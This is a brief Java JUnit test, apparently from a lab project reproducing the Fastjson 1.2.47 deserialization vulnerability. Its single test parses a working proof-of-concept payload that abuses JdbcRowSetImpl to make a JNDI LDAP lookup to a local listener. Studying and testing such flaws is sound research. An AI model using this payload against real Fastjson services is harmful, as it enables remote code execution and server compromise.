package me.mole;

import com.alibaba.fastjson.JSON;
import me.mole.pojo.Student;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.HashMap;

public class Fastjson1247ApplicationTest {

    @Test
    public void test_1247_poc_1() {
        String fj_poc = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8085/abc\",\"autoCommit\":true}}";
        System.out.println(fj_poc);
        JSON.parseObject(fj_poc, Student.class);
    }
}
